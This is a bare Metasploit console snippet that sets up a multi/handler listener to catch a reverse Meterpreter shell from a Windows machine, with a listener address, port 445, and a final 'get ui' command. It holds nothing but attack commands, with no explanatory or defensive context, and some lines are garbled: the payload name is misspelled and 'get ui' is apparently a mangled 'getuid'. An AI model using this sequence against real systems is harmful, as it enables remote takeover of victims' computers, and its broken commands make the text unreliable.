use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverser_https
set LHOST 192.166.56.1
set LPORT 445 
exploit
get ui
